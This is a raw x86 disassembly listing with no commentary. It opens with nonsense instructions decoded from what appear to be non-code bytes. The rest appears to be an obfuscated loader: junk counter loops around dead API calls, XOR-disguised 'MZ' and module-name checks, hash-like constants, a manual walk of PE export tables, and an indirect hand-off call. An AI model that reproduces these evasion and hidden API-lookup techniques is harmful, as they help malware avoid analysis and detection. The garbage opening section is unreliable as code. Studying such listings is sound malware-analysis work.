  4223c5:	gs shl al,cl
  4223c8:	jbe    0x4223e1
  4223ca:	sub    esi,DWORD PTR [edx]
  4223cc:	or     DWORD PTR [ecx],0xfffffff0
  4223cf:	xor    edx,DWORD PTR [ebx]
  4223d1:	inc    eax
  4223d2:	stc    
  4223d3:	dec    edx
  4223d4:	mov    al,0x6f
  4223d6:	mov    ds:0xb50ce29,eax
  4223db:	inc    edx
  4223dc:	inc    ebx
  4223dd:	jge    0x4223ce
  4223df:	std    
  4223e0:	aam    0xdd
  4223e2:	mov    ch,BYTE PTR [edx-0x3dba24d9]
  4223e8:	and    esp,DWORD PTR [ecx-0x4592c541]
  4223ee:	popa   
  4223ef:	fs rcl ch,cl
  4223f2:	push   esp
  4223f3:	push   ss
  4223f4:	out    dx,eax
  4223f5:	jnp    0x4223d7
  4223f7:	(bad)  
  4223f9:	popa   
  4223fa:	jmp    0x98f:0x1043d983
  422401:	popf   
  422402:	sbb    BYTE PTR [ebp+0x6d6a0381],dh
  422408:	popw   ss
  42240a:	lods   al,BYTE PTR ds:[esi]
  42240b:	lahf   
  42240c:	in     eax,0x1d
  42240e:	rcr    esp,cl
  422410:	cmp    DWORD PTR [ebx+0x7592414e],0xdd68861f
  42241a:	adc    al,0x3b
  42241c:	cmp    edi,DWORD PTR [edi+0x41]
  42241f:	jnp    0x42246e
  422421:	sub    al,0x25
  422423:	inc    ebx
  422424:	or     esi,DWORD PTR [esi]
  422426:	test   BYTE PTR [esi+ebx*4-0x3edc7325],bl
  42242d:	jne    0x422404
  42242f:	jecxz  0x4224aa
  422431:	mov    DWORD PTR [ecx],edi
  422433:	lock shl dh,0xcf
  422437:	arpl   sp,sp
  422439:	stos   DWORD PTR es:[edi],eax
  42243a:	(bad)  
  42243b:	(bad)  
  42243c:	cmp    esp,DWORD PTR [eax+0x5c523ad4]
  422442:	push   esi
  422443:	adc    BYTE PTR [ebx+0x57a52b5c],ch
  422449:	mov    ecx,0x4070589c
  42244e:	in     al,dx
  42244f:	les    ecx,FWORD PTR [esi-0x5a]
  422452:	inc    edx
  422453:	in     eax,dx
  422454:	adc    eax,0x92a757a4
  422459:	popf   
  42245a:	div    BYTE PTR ds:0x29d1ee0f
  422460:	xor    DWORD PTR [edi],ebx
  422462:	push   es
  422463:	inc    eax
  422464:	cmp    al,0xb2
  422466:	cmp    BYTE PTR [ecx-0x32],ch
  422469:	bound  ebp,QWORD PTR [ebp-0x70]
  42246c:	adc    ebp,DWORD PTR ds:[ecx]
  42246f:	cli    
  422470:	pand   mm6,QWORD PTR [eax+0x98c210b]
  422477:	add    eax,0xe8a22cf6
  42247c:	and    al,0x8f
  42247e:	call   0x16e5:0x4096eef9
  422485:	and    BYTE PTR [esi+0x67351243],al
  42248b:	sbb    al,dh
  42248d:	ficomp WORD PTR [ecx+0x418b49e6]
  422493:	mov    ebx,DWORD PTR [esi-0x5cb6b719]
  422499:	mov    ch,0x51
  42249b:	and    edx,DWORD PTR [ebx+0x1f]
  42249e:	push   DWORD PTR [ebp-0x24]
  4224a1:	mov    BYTE PTR [eax],0xe9
  4224a4:	mov    eax,ds:0x42a2ee
  4224a9:	push   DWORD PTR [eax]
  4224ab:	push   DWORD PTR ds:0x42a552
  4224b1:	push   DWORD PTR ds:0x42a2f6
  4224b7:	push   DWORD PTR ds:0x42a532
  4224bd:	push   DWORD PTR ds:0x42af72
  4224c3:	push   DWORD PTR [ebp-0x28]
  4224c6:	push   DWORD PTR [ebp-0x2c]
  4224c9:	mov    eax,DWORD PTR [ebp-0x14]
  4224cc:	call   eax
  4224ce:	pop    edi
  4224cf:	pop    esi
  4224d0:	leave  
  4224d1:	ret    
  4224d2:	push   ebp
  4224d3:	mov    ebp,esp
  4224d5:	sub    esp,0x34
  4224d8:	push   ebx
  4224d9:	adc    edx,DWORD PTR ds:0x42b1aa
  4224df:	push   esi
  4224e0:	movzx  ecx,BYTE PTR ds:0x42b1ea
  4224e7:	sbb    DWORD PTR ds:0x42b21a,ecx
  4224ed:	push   edi
  4224ee:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  4224f5:	and    DWORD PTR ds:0x42b1c6,0x0
  4224ff:	mov    ecx,DWORD PTR ds:0x42b1c6
  422505:	inc    ecx
  422506:	mov    DWORD PTR ds:0x42b1c6,ecx
  42250c:	cmp    DWORD PTR ds:0x42b1c6,0xd
  422513:	jg     0x422552
  422519:	jmp    0x422529
  42251e:	push   0x42b1ba
  422523:	call   DWORD PTR ds:0x42b2f6
  422529:	cmp    DWORD PTR ds:0x42b1c6,0xc
  422530:	jne    0x422545
  422536:	xor    ecx,ecx
  422538:	xor    ecx,DWORD PTR ds:0x42b1c6
  42253e:	inc    ecx
  42253f:	mov    DWORD PTR ds:0x42b1c6,ecx
  422545:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  42254c:	jb     0x4224ff
  422552:	lea    eax,[ebp+0x14]
  422555:	mov    DWORD PTR [ebp-0x4],eax
  422558:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  42255f:	lea    eax,[ebp-0xc]
  422562:	mov    DWORD PTR ds:0x42b19e,0x11
  42256c:	cmp    DWORD PTR ds:0x42b19e,0x0
  422573:	je     0x4225cf
  422579:	cmp    DWORD PTR ds:0x42b19e,0x2
  422580:	jge    0x4225cf
  422586:	jmp    0x4225a3
  42258b:	push   0x42b1fa
  422590:	push   0x42b222
  422595:	push   DWORD PTR [ebp-0x28]
  422598:	push   0x42a03d
  42259d:	call   DWORD PTR ds:0x42b2fa
  4225a3:	cmp    DWORD PTR ds:0x42b19e,0x3
  4225aa:	jne    0x4225bd
  4225b0:	mov    esi,DWORD PTR ds:0x42b19e
  4225b6:	dec    esi
  4225b7:	mov    DWORD PTR ds:0x42b19e,esi
  4225bd:	mov    esi,DWORD PTR ds:0x42b19e
  4225c3:	dec    esi
  4225c4:	mov    DWORD PTR ds:0x42b19e,esi
  4225ca:	jmp    0x42256c
  4225cf:	mov    DWORD PTR [ebp-0x14],eax
  4225d2:	and    DWORD PTR ds:0x42b1f2,0x0
  4225dc:	jmp    0x4225ee
  4225e1:	mov    esi,DWORD PTR ds:0x42b1f2
  4225e7:	inc    esi
  4225e8:	mov    DWORD PTR ds:0x42b1f2,esi
  4225ee:	cmp    DWORD PTR ds:0x42b1f2,0x1a
  4225f5:	jae    0x422622
  4225fb:	cmp    DWORD PTR ds:0x42b1f2,0x2a
  422602:	jle    0x422622
  422608:	jmp    0x42261d
  42260d:	push   0x42b1ca
  422612:	push   0x42a18d
  422617:	call   DWORD PTR ds:0x42b2fe
  42261d:	jmp    0x4225e1
  422622:	mov    eax,DWORD PTR [ebp-0xc]
  422625:	mov    DWORD PTR ds:0x42b202,0x1d
  42262f:	cmp    DWORD PTR ds:0x42b202,0x0
  422636:	je     0x422692
  42263c:	cmp    DWORD PTR ds:0x42b202,0xb
  422643:	jbe    0x422692
  422649:	jmp    0x422664
  42264e:	push   DWORD PTR [ebp-0x28]
  422651:	push   0x8416
  422656:	push   0x42a285
  42265b:	push   DWORD PTR [ebp-0xc]
  42265e:	call   DWORD PTR ds:0x42b306
  422664:	cmp    DWORD PTR ds:0x42b202,0xc
  42266b:	jne    0x42267e
  422671:	mov    esi,DWORD PTR ds:0x42b202
  422677:	dec    esi
  422678:	mov    DWORD PTR ds:0x42b202,esi
  42267e:	xor    esi,esi
  422680:	add    esi,DWORD PTR ds:0x42b202
  422686:	dec    esi
  422687:	mov    DWORD PTR ds:0x42b202,esi
  42268d:	jmp    0x42262f
  422692:	mov    edx,DWORD PTR [ebp-0x14]
  422695:	xor    esi,ecx
  422697:	mov    ecx,0x75108ae
  42269c:	sbb    esi,0x78cf
  4226a2:	xor    eax,ecx
  4226a4:	add    eax,0x3272f5
  4226a9:	mov    DWORD PTR [edx],eax
  4226ab:	xor    eax,eax
  4226ad:	or     eax,DWORD PTR ds:0x42b2b6
  4226b3:	mov    eax,DWORD PTR [eax]
  4226b5:	and    DWORD PTR ds:0x42b1c2,eax
  4226bb:	mov    eax,ds:0x42a2ea
  4226c0:	mov    edx,DWORD PTR [ebp-0x4]
  4226c3:	movzx  esi,BYTE PTR ds:0x42b1b2
  4226ca:	adc    DWORD PTR ds:0x42b206,esi
  4226d0:	mov    eax,DWORD PTR [eax]
  4226d2:	add    eax,DWORD PTR [edx]
  4226d4:	and    DWORD PTR ds:0x42b1ee,ecx
  4226da:	mov    DWORD PTR [ebp-0x8],eax
  4226dd:	mov    esi,DWORD PTR [ebp+0x8]
  4226e0:	and    DWORD PTR ds:0x42b1b2,0x0
  4226ea:	jmp    0x4226fa
  4226ef:	mov    eax,ds:0x42b1b2
  4226f4:	inc    eax
  4226f5:	mov    ds:0x42b1b2,eax
  4226fa:	cmp    DWORD PTR ds:0x42b1b2,0x15
  422701:	jae    0x422746
  422707:	cmp    DWORD PTR ds:0x42b1b2,0x9
  42270e:	jbe    0x422746
  422714:	jmp    0x422729
  422719:	push   0x42a26b
  42271e:	push   0x0
  422720:	push   DWORD PTR [ebp-0x28]
  422723:	call   DWORD PTR ds:0x42b30e
  422729:	cmp    DWORD PTR ds:0x42b1b2,0x8
  422730:	jne    0x422741
  422736:	mov    eax,ds:0x42b1b2
  42273b:	inc    eax
  42273c:	mov    ds:0x42b1b2,eax
  422741:	jmp    0x4226ef
  422746:	mov    eax,ds:0x42a472
  42274b:	mov    DWORD PTR ds:0x42b21e,0x16
  422755:	cmp    DWORD PTR ds:0x42b21e,0x0
  42275c:	je     0x42278f
  422762:	cmp    DWORD PTR ds:0x42b21e,0x19
  422769:	jbe    0x42278f
  42276f:	jmp    0x42277d
  422774:	push   DWORD PTR [ebp-0x20]
  422777:	call   DWORD PTR ds:0x42b316
  42277d:	mov    edx,DWORD PTR ds:0x42b21e
  422783:	dec    edx
  422784:	mov    DWORD PTR ds:0x42b21e,edx
  42278a:	jmp    0x422755
  42278f:	mov    eax,DWORD PTR [eax+0x198]
  422795:	movzx  edx,WORD PTR ds:0x42b18e
  42279c:	xor    edx,DWORD PTR ds:0x42b1d6
  4227a2:	mov    DWORD PTR ds:0x42b18e,edx
  4227a8:	xor    esi,ecx
  4227aa:	and    DWORD PTR ds:0x42b1c2,0x42b1b2
  4227b4:	mov    edx,0x3272f5
  4227b9:	add    DWORD PTR ds:0x42b1ce,0x42b1c2
  4227c3:	add    esi,edx
  4227c5:	mov    DWORD PTR ds:0x42b1be,0x75ce
  4227cf:	cmp    DWORD PTR [eax],esi
  4227d1:	je     0x4227e8
  4227d7:	mov    eax,DWORD PTR [eax]
  4227d9:	mov    DWORD PTR ds:0x42b18e,0x18de
  4227e3:	jmp    0x422b4e
  4227e8:	mov    eax,DWORD PTR [ebp+0x18]
  4227eb:	mov    esi,DWORD PTR ds:0x42b1ee
  4227f1:	adc    DWORD PTR ds:0x42b212,esi
  4227f7:	mov    esi,DWORD PTR [ebp+0x1c]
  4227fa:	or     ebx,0xffffffff
  4227fd:	mov    DWORD PTR ds:0x42b21a,0x5f57
  422807:	cmp    eax,0x70941f95
  42280c:	mov    DWORD PTR ds:0x42b19e,0x397d
  422816:	jne    0x422857
  42281c:	mov    DWORD PTR ds:0x42b196,0x41c1
  422826:	cmp    esi,ebx
  422828:	mov    DWORD PTR ds:0x42b18e,0x6f0
  422832:	jne    0x422857
  422838:	mov    DWORD PTR ds:0x42b1e6,0x1213
  422842:	push   ebx
  422843:	push   0x70941f94
  422848:	mov    DWORD PTR ds:0x42b1ea,0x77db
  422852:	jmp    0x422b3d
  422857:	mov    eax,DWORD PTR [ebp+0x18]
  42285a:	mov    esi,DWORD PTR [ebp+0x1c]
  42285d:	mov    DWORD PTR ds:0x42b1f6,0x6621
  422867:	cmp    eax,0x70941f94
  42286c:	jne    0x422899
  422872:	mov    DWORD PTR ds:0x42b1d2,0x1239
  42287c:	cmp    esi,ebx
  42287e:	mov    DWORD PTR ds:0x42b1ea,0x2737
  422888:	jne    0x422899
  42288e:	push   ebx
  42288f:	push   0x70941f97
  422894:	jmp    0x422b3d
  422899:	mov    eax,DWORD PTR [ebp+0x18]
  42289c:	mov    esi,DWORD PTR [ebp+0x1c]
  42289f:	cmp    eax,0x70941f97
  4228a4:	jne    0x4228c7
  4228aa:	mov    DWORD PTR ds:0x42b1ba,0x121e
  4228b4:	cmp    esi,ebx
  4228b6:	jne    0x4228c7
  4228bc:	push   ebx
  4228bd:	push   0x70941f96
  4228c2:	jmp    0x422b3d
  4228c7:	mov    eax,DWORD PTR [ebp+0x18]
  4228ca:	mov    DWORD PTR ds:0x42b202,0x572d
  4228d4:	mov    esi,DWORD PTR [ebp+0x1c]
  4228d7:	cmp    eax,0x70941f96
  4228dc:	mov    DWORD PTR ds:0x42b1aa,0x369b
  4228e6:	jne    0x42291d
  4228ec:	cmp    esi,ebx
  4228ee:	jne    0x42291d
  4228f4:	mov    DWORD PTR ds:0x42b18a,0xe5c
  4228fe:	push   ebx
  4228ff:	mov    DWORD PTR ds:0x42b22e,0x5e71
  422909:	push   0x70941f99
  42290e:	mov    DWORD PTR ds:0x42b1d6,0x2b39
  422918:	jmp    0x422b3d
  42291d:	mov    DWORD PTR ds:0x42b1da,edi
  422923:	mov    esi,DWORD PTR [ebp+0x18]
  422926:	mov    eax,0x5593
  42292b:	mov    edi,DWORD PTR [ebp+0x1c]
  42292e:	mov    eax,0x70941f98
  422933:	mov    DWORD PTR ds:0x42b1a2,0x1ef3
  42293d:	cmp    esi,eax
  42293f:	mov    DWORD PTR ds:0x42b1be,0x2a6e
  422949:	jne    0x422b21
  42294f:	cmp    edi,ebx
  422951:	mov    DWORD PTR ds:0x42b19e,0x8e7
  42295b:	jne    0x422b21
  422961:	sbb    DWORD PTR ds:0x42b1ea,0x3412
  42296b:	mov    eax,DWORD PTR [ebp+0x10]
  42296e:	or     edi,edi
  422970:	xor    eax,ecx
  422972:	sbb    DWORD PTR ds:0x42b1c2,edx
  422978:	add    eax,edx
  42297a:	mov    DWORD PTR [ebp-0x20],eax
  42297d:	mov    eax,DWORD PTR [ebp+0xc]
  422980:	mov    esi,DWORD PTR [ebp-0x8]
  422983:	xor    eax,ecx
  422985:	add    eax,edx
  422987:	imul   eax,DWORD PTR [esi]
  42298a:	mov    esi,DWORD PTR [ebp+0x8]
  42298d:	xor    esi,ecx
  42298f:	add    esi,edx
  422991:	cmp    esi,eax
  422993:	mov    eax,DWORD PTR [ebp-0x4]
  422996:	mov    edi,0xffcd8d0b
  42299b:	je     0x4229ba
  4229a1:	mov    esi,DWORD PTR [ebp-0x20]
  4229a4:	add    DWORD PTR [eax],esi
  4229a6:	mov    eax,DWORD PTR [ebp-0x4]
  4229a9:	mov    esi,DWORD PTR [ebp+0xc]
  4229ac:	xor    esi,ecx
  4229ae:	add    esi,edx
  4229b0:	imul   esi,DWORD PTR [eax]
  4229b3:	mov    DWORD PTR [eax],esi
  4229b5:	jmp    0x4229bf
  4229ba:	mov    esi,DWORD PTR [ebp+0x14]
  4229bd:	xor    DWORD PTR [eax],esi
  4229bf:	mov    eax,DWORD PTR [ebp-0x4]
  4229c2:	mov    esi,DWORD PTR [ebp+0x10]
  4229c5:	xor    esi,ecx
  4229c7:	sub    edi,esi
  4229c9:	add    DWORD PTR [eax],edi
  4229cb:	mov    eax,DWORD PTR [ebp-0x4]
  4229ce:	mov    esi,DWORD PTR [ebp-0x8]
  4229d1:	add    esi,DWORD PTR [eax]
  4229d3:	mov    DWORD PTR [ebp-0x8],esi
  4229d6:	mov    eax,DWORD PTR [ebp+0xc]
  4229d9:	mov    esi,DWORD PTR [ebp+0xc]
  4229dc:	xor    esi,ecx
  4229de:	xor    eax,ecx
  4229e0:	lea    eax,[eax+esi*1+0x64e5ea]
  4229e7:	mov    esi,DWORD PTR [ebp+0xc]
  4229ea:	xor    esi,ecx
  4229ec:	add    esi,edx
  4229ee:	imul   eax,esi
  4229f1:	mov    esi,DWORD PTR [ebp+0xc]
  4229f4:	xor    esi,ecx
  4229f6:	sub    esi,eax
  4229f8:	mov    eax,DWORD PTR [ebp-0x4]
  4229fb:	add    esi,edx
  4229fd:	cmp    DWORD PTR [eax],esi
  4229ff:	mov    eax,DWORD PTR [ebp-0x4]
  422a02:	mov    esi,DWORD PTR [ebp+0x10]
  422a05:	jg     0x422a1b
  422a0b:	xor    esi,ecx
  422a0d:	mov    edi,0xffcd8d0b
  422a12:	sub    edi,esi
  422a14:	add    DWORD PTR [eax],edi
  422a16:	jmp    0x422a21
  422a1b:	xor    esi,ecx
  422a1d:	add    esi,edx
  422a1f:	add    DWORD PTR [eax],esi
  422a21:	mov    eax,DWORD PTR [ebp-0x8]
  422a24:	mov    esi,DWORD PTR [ebp-0x10]
  422a27:	mov    eax,DWORD PTR [eax]
  422a29:	xor    esi,ecx
  422a2b:	add    esi,0x3272f4
  422a31:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a38:	mov    DWORD PTR [ebp-0x24],ebx
  422a3b:	not    esi
  422a3d:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a44:	mov    DWORD PTR [ebp-0x2c],ebx
  422a47:	mov    ebx,DWORD PTR [ebp-0x28]
  422a4a:	mov    edi,DWORD PTR [ebp-0x24]
  422a4d:	and    eax,esi
  422a4f:	mov    esi,0xa141
  422a54:	xor    bx,si
  422a57:	mov    esi,0x412c
  422a5c:	add    bx,si
  422a5f:	cmp    WORD PTR [eax],bx
  422a62:	je     0x422aac
  422a68:	mov    edi,DWORD PTR [ebp-0x10]
  422a6b:	xor    edi,ecx
  422a6d:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a74:	mov    DWORD PTR [ebp-0x24],0xffffffff
  422a7b:	mov    ebx,0xffcd8d0b
  422a80:	sub    ebx,edi
  422a82:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a89:	add    eax,ebx
  422a8b:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  422a92:	mov    edi,DWORD PTR [ebp-0x28]
  422a95:	mov    ebx,DWORD PTR [ebp-0x24]
  422a98:	mov    ebx,0xa141
  422a9d:	xor    di,bx
  422aa0:	add    di,si
  422aa3:	cmp    WORD PTR [eax],di
  422aa6:	jne    0x422a68
  422aac:	mov    edi,DWORD PTR [ebp-0x14]
  422aaf:	mov    edi,DWORD PTR [edi]
  422ab1:	mov    ebx,DWORD PTR [eax+0x3c]
  422ab4:	lea    edi,[ebx+edi*8+0x78]
  422ab8:	mov    edi,DWORD PTR [edi+eax*1]
  422abb:	mov    DWORD PTR [ebp-0x18],edi
  422abe:	mov    edi,DWORD PTR [ebp+0x8]
  422ac1:	xor    edi,ecx
  422ac3:	add    edi,edx
  422ac5:	mov    DWORD PTR [ebp-0x1c],edi
  422ac8:	mov    edi,DWORD PTR [ebp+0x8]
  422acb:	xor    edi,ecx
  422acd:	mov    ecx,DWORD PTR [ebp-0x18]
  422ad0:	add    edi,edx
  422ad2:	cmp    ecx,edi
  422ad4:	je     0x422b16
  422ada:	mov    ecx,DWORD PTR [ebp-0x18]
  422add:	add    ecx,eax
  422adf:	mov    DWORD PTR [ebp-0x1c],ecx
  422ae2:	mov    ecx,DWORD PTR [ebp-0x30]
  422ae5:	mov    edx,DWORD PTR [ebp-0x2c]
  422ae8:	mov    edx,0xa141
  422aed:	xor    cx,dx
  422af0:	mov    edx,DWORD PTR [ebp-0x1c]
  422af3:	mov    edx,DWORD PTR [edx+0xc]
  422af6:	add    cx,si
  422af9:	cmp    WORD PTR [eax+edx*1],cx
  422afd:	jne    0x422b16
  422b03:	mov    ecx,DWORD PTR ds:0x42a472
  422b09:	mov    ecx,DWORD PTR [ecx+0x198]
  422b0f:	mov    DWORD PTR [ecx],eax
  422b11:	jmp    0x422b4e
  422b16:	push   DWORD PTR [ebp+0x1c]
  422b19:	push   DWORD PTR [ebp+0x18]
  422b1c:	jmp    0x422b3d
  422b21:	mov    ecx,DWORD PTR [ebp+0x18]
  422b24:	mov    edx,DWORD PTR [ebp+0x1c]
  422b27:	cmp    ecx,0x70941f99
  422b2d:	jne    0x422b4e
  422b33:	cmp    edx,ebx
  422b35:	jne    0x422b4e
  422b3b:	push   ebx
  422b3c:	push   eax
  422b3d:	push   DWORD PTR [ebp+0x14]
  422b40:	push   DWORD PTR [ebp+0x10]
  422b43:	push   DWORD PTR [ebp+0xc]
  422b46:	push   DWORD PTR [ebp+0x8]
  422b49:	call   0x4224d2
  422b4e:	pop    edi
  422b4f:	pop    esi
  422b50:	pop    ebx
  422b51:	leave  
  422b52:	ret    0x18
  422b55:	push   ebp
  422b56:	mov    ebp,esp
  422b58:	and    esp,0xfffffff8
  422b5b:	sub    esp,0x3fc
  422b61:	or     DWORD PTR ds:0x42b1a6,0x42b1c2
  422b6b:	push   ebx
  422b6c:	xor    DWORD PTR ds:0x42b216,0x42b1b6
  422b76:	push   esi
  422b77:	push   edi
  422b78:	or     DWORD PTR ds:0x42b19e,0x42b192
  422b82:	lea    eax,[esp+0x1b8]
  422b89:	push   eax
  422b8a:	sub    DWORD PTR ds:0x42b222,0x377b
  422b94:	push   0x42a596
  422b99:	call   DWORD PTR ds:0x42b312
  422b9f:	mov    DWORD PTR ds:0x42b1ee,0x356c
  422ba9:	cmp    eax,0xffffffff
  422bac:	mov    DWORD PTR ds:0x42b1d6,0x3f42
  422bb6:	je     0x422bf9
  422bbc:	sub    DWORD PTR ds:0x42b206,0x3b29
  422bc6:	push   0x42a5ca
  422bcb:	adc    DWORD PTR ds:0x42b1a6,0xd7b
  422bd5:	push   0x89677644
  422bda:	adc    DWORD PTR ds:0x42b226,0x42b22a
  422be4:	call   DWORD PTR ds:0x42b2e2
  422bea:	mov    DWORD PTR ds:0x42b1da,0xf4c
  422bf4:	jmp    0x423de7
  422bf9:	and    DWORD PTR ds:0x42b202,0xcb9
  422c03:	mov    esi,DWORD PTR ds:0x42b302
  422c09:	add    DWORD PTR ds:0x42b21e,0x42b22a
  422c13:	push   0xf
  422c15:	lea    eax,[esp+0x44]
  422c19:	push   eax
  422c1a:	push   0x42a5de
  422c1f:	push   0x42a5f2
  422c24:	mov    DWORD PTR ds:0x42b19a,0x6718
  422c2e:	push   0x42a616
  422c33:	add    DWORD PTR ds:0x42b1fe,0x42b1be
  422c3d:	call   esi
  422c3f:	imul   eax,eax,0x300000
  422c45:	cmp    eax,0x1b00000
  422c4a:	mov    DWORD PTR ds:0x42b1a6,0x2dc4
  422c54:	je     0x422c6b
  422c5a:	xor    eax,eax
  422c5c:	mov    DWORD PTR ds:0x42b18e,0x4419
  422c66:	jmp    0x423de7
  422c6b:	add    DWORD PTR ds:0x42b19e,0x42b1e6
  422c75:	lea    eax,[esp+0x78]
  422c79:	or     DWORD PTR ds:0x42b1b2,0x1042
  422c83:	push   eax
  422c84:	add    DWORD PTR ds:0x42b1a6,0x42b1e2
  422c8e:	push   0xffffffff
  422c90:	xor    DWORD PTR ds:0x42b1be,0x42b22a
  422c9a:	call   DWORD PTR ds:0x42b30a
  422ca0:	test   eax,eax
  422ca2:	mov    DWORD PTR ds:0x42b192,0x385a
  422cac:	jne    0x422c5a
  422cb2:	and    DWORD PTR ds:0x42b1de,0x0
  422cbc:	jmp    0x422cce
  422cc1:	mov    edi,DWORD PTR ds:0x42b1de
  422cc7:	inc    edi
  422cc8:	mov    DWORD PTR ds:0x42b1de,edi
  422cce:	cmp    DWORD PTR ds:0x42b1de,0x1d
  422cd5:	jae    0x422d1a
  422cdb:	cmp    DWORD PTR ds:0x42b1de,0xe
  422ce2:	jg     0x422d1a
  422ce8:	jmp    0x422cf9
  422ced:	push   DWORD PTR [ebp-0x10]
  422cf0:	push   DWORD PTR [ebp-0x14]
  422cf3:	call   DWORD PTR ds:0x42b31a
  422cf9:	cmp    DWORD PTR ds:0x42b1de,0xd
  422d00:	jne    0x422d15
  422d06:	xor    edi,edi
  422d08:	or     edi,DWORD PTR ds:0x42b1de
  422d0e:	inc    edi
  422d0f:	mov    DWORD PTR ds:0x42b1de,edi
  422d15:	jmp    0x422cc1
  422d1a:	mov    DWORD PTR [esp+0x30],eax
  422d1e:	mov    ecx,0xf89c85a5
  422d23:	and    DWORD PTR ds:0x42b20e,0x0
  422d2d:	mov    edx,DWORD PTR ds:0x42b20e
  422d33:	inc    edx
  422d34:	mov    DWORD PTR ds:0x42b20e,edx
  422d3a:	cmp    DWORD PTR ds:0x42b20e,0x21
  422d41:	jl     0x422d73
  422d47:	jmp    0x422d66
  422d4c:	push   0x42b1a2
  422d51:	push   0x1a2f
  422d56:	push   0x42a26b
  422d5b:	push   0x42a000
  422d60:	call   DWORD PTR ds:0x42b31e
  422d66:	cmp    DWORD PTR ds:0x42b20e,0x13
  422d6d:	jb     0x422d2d
  422d73:	mov    DWORD PTR [esp+0x18],ecx
  422d77:	mov    ebx,DWORD PTR ds:0x42b28e
  422d7d:	mov    edx,DWORD PTR ds:0x42b2be
  422d83:	sub    edx,ebx
  422d85:	add    ebx,DWORD PTR [ebx+edx*1]
  422d88:	mov    DWORD PTR [esp+0xc],0xf89c85a2
  422d90:	mov    ebx,DWORD PTR ds:0x42b26a
  422d96:	xor    edx,edx
  422d98:	or     edx,DWORD PTR ds:0x42b2aa
  422d9e:	sub    ebx,edx
  422da0:	and    ebx,DWORD PTR [ebx+edx*1]
  422da3:	lea    eax,[esp+0x3c]
  422da7:	or     edi,0x6d65
  422dad:	mov    DWORD PTR [esp+0x30],eax
  422db1:	adc    DWORD PTR ds:0x42b212,0x17e9
  422dbb:	lea    eax,[esp+0x38]
  422dbf:	and    DWORD PTR ds:0x42b20a,0x0
  422dc9:	mov    edx,DWORD PTR ds:0x42b20a
  422dcf:	inc    edx
  422dd0:	mov    DWORD PTR ds:0x42b20a,edx
  422dd6:	cmp    DWORD PTR ds:0x42b20a,0xc
  422ddd:	jle    0x422e18
  422de3:	jmp    0x422df1
  422de8:	push   DWORD PTR [ebp-0x14]
  422deb:	call   DWORD PTR ds:0x42b322
  422df1:	cmp    DWORD PTR ds:0x42b20a,0xb
  422df8:	jne    0x422e0b
  422dfe:	mov    edx,DWORD PTR ds:0x42b20a
  422e04:	inc    edx
  422e05:	mov    DWORD PTR ds:0x42b20a,edx
  422e0b:	cmp    DWORD PTR ds:0x42b20a,0x12
  422e12:	jb     0x422dc9
  422e18:	mov    DWORD PTR [esp+0x20],eax
  422e1c:	xor    edx,edx
  422e1e:	add    edx,DWORD PTR ds:0x42b292
  422e24:	mov    eax,ds:0x42b29a
  422e29:	sub    eax,edx
  422e2b:	add    edx,DWORD PTR [edx+eax*1]
  422e2e:	mov    eax,ds:0x42a472
  422e33:	mov    eax,DWORD PTR [eax+0x1c8]
  422e39:	mov    eax,DWORD PTR [eax]
  422e3b:	adc    edi,0x4659
  422e41:	mov    edx,DWORD PTR [esp+0x20]
  422e45:	xor    ebx,ebx
  422e47:	mov    edi,0x75108ae
  422e4c:	adc    ebx,DWORD PTR ds:0x42b226
  422e52:	xor    eax,edi
  422e54:	mov    ebx,DWORD PTR ds:0x42b1d2
  422e5a:	sbb    ebx,DWORD PTR ds:0x42b1ca
  422e60:	mov    DWORD PTR ds:0x42b1d2,ebx
  422e66:	mov    ebx,0x3272f5
  422e6b:	add    eax,ebx
  422e6d:	mov    DWORD PTR ds:0x42b182,0x4af1
  422e77:	mov    DWORD PTR [edx],eax
  422e79:	mov    eax,ds:0x42b042
  422e7e:	cmp    eax,0x455dedfa
  422e83:	jne    0x422fd8
  422e89:	and    DWORD PTR ds:0x42b1c6,0x0
  422e93:	mov    eax,ds:0x42b1c6
  422e98:	inc    eax
  422e99:	mov    ds:0x42b1c6,eax
  422e9e:	cmp    DWORD PTR ds:0x42b1c6,0x9
  422ea5:	ja     0x422ede
  422eab:	jmp    0x422eb9
  422eb0:	push   DWORD PTR [ebp-0x18]
  422eb3:	call   DWORD PTR ds:0x42b326
  422eb9:	cmp    DWORD PTR ds:0x42b1c6,0x8
  422ec0:	jne    0x422ed1
  422ec6:	mov    eax,ds:0x42b1c6
  422ecb:	inc    eax
  422ecc:	mov    ds:0x42b1c6,eax
  422ed1:	cmp    DWORD PTR ds:0x42b1c6,0x17
  422ed8:	jb     0x422e93
  422ede:	mov    eax,DWORD PTR [esp+0x18]
  422ee2:	and    DWORD PTR ds:0x42b1ca,0x0
  422eec:	jmp    0x422f00
  422ef1:	xor    edx,edx
  422ef3:	add    edx,DWORD PTR ds:0x42b1ca
  422ef9:	inc    edx
  422efa:	mov    DWORD PTR ds:0x42b1ca,edx
  422f00:	cmp    DWORD PTR ds:0x42b1ca,0x11
  422f07:	jae    0x422f60
  422f0d:	cmp    DWORD PTR ds:0x42b1ca,0x7
  422f14:	ja     0x422f60
  422f1a:	jmp    0x422f41
  422f1f:	push   0x42a04a
  422f24:	push   DWORD PTR [ebp-0x18]
  422f27:	push   0x268e
  422f2c:	push   0x3495
  422f31:	push   0x4b1a
  422f36:	push   0x4d1d
  422f3b:	call   DWORD PTR ds:0x42b2ea
  422f41:	cmp    DWORD PTR ds:0x42b1ca,0x6
  422f48:	jne    0x422f5b
  422f4e:	mov    edx,DWORD PTR ds:0x42b1ca
  422f54:	inc    edx
  422f55:	mov    DWORD PTR ds:0x42b1ca,edx
  422f5b:	jmp    0x422ef1
  422f60:	mov    edx,DWORD PTR ds:0x42a472
  422f66:	add    DWORD PTR ds:0x42b20e,0x42b1fe
  422f70:	mov    edx,DWORD PTR [edx+0x198]
  422f76:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  422f80:	xor    eax,edi
  422f82:	add    eax,ebx
  422f84:	sub    DWORD PTR ds:0x42b202,0x7175
  422f8e:	mov    DWORD PTR [edx],eax
  422f90:	sbb    DWORD PTR ds:0x42b1da,edi
  422f96:	mov    eax,DWORD PTR [esp+0x18]
  422f9a:	xor    eax,edi
